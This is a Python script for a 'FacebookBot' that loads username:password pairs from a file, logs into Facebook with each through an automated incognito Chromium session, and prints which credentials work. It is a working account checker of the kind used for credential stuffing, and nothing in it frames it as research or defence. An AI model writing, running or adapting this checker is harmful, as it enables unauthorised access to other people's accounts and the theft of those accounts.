import time
from DrissionPage import ChromiumPage, ChromiumOptions

class FacebookBot:
    def __init__(self):
        self.encode = 'utf-8'
        self.driver = None

    def read_from_file(self, path):
        try:
            with open(path, "r", encoding=self.encode) as file:
                return file.read()
        except Exception as e:
            print(f'read_from_file exception: {str(e)}')

    def write_to_file(self, path, content):
        try:
            with open(path, "a", encoding=self.encode) as file:
                txt = self.read_from_file(path)
                if content not in txt:
                    file.write(f"{content}\n")
        except Exception as e:
            print(f'write_to_file exception: {str(e)}')

    def setup_chromium(self):
        try:
            options = ChromiumOptions()
            options.set_paths('/usr/bin/google-chrome')

            arguments = [
                "-no-first-run",
                "-force-color-profile=srgb",
                "-metrics-recording-only",
                "-password-store=basic",
                "-use-mock-keychain",
                "-export-tagged-pdf",
                "-no-default-browser-check",
                "-disable-background-mode",
                "-enable-features=NetworkService,NetworkServiceInProcess,LoadCryptoTokenExtension,PermuteTLSExtensions",
                "-disable-features=FlashDeprecationWarning,EnablePasswordsAccountStorage",
                "-deny-permission-prompts",
                "-disable-gpu",
                "--incognito"
            ]

            for argument in arguments:
                options.set_argument(argument)

            self.driver = ChromiumPage(options)
            return self.driver
        except Exception as e:
            print(f'setup_chromium exception: {str(e)}')

    def process_account(self, acc):
        try:
            username, password = acc.split(":")

            self.driver.get('https://www.facebook.com')

            login_input = self.driver.ele('xpath://*[@id="email"]')
            password_input = self.driver.ele('xpath://*[@id="pass"]')
            submit_button = self.driver.ele('xpath://*[@name="login"]')

            login_input.input(username)
            password_input.input(password)
            submit_button.click()

            time.sleep(5)

            if "https://www.facebook.com/" == self.driver.url:
                print(f"work -> {acc}")

            self.driver.close()
        except Exception as e:
            print(f'process_account exception: {str(e)}')

    def run(self):
        accounts_list = self.read_from_file('/path/to/accounts.txt')

        if accounts_list:
            for account in accounts_list.split('\n'):
                self.setup_chromium()
                self.process_account(account)


if __name__ == '__main__':
    bot = FacebookBot()
    bot.run()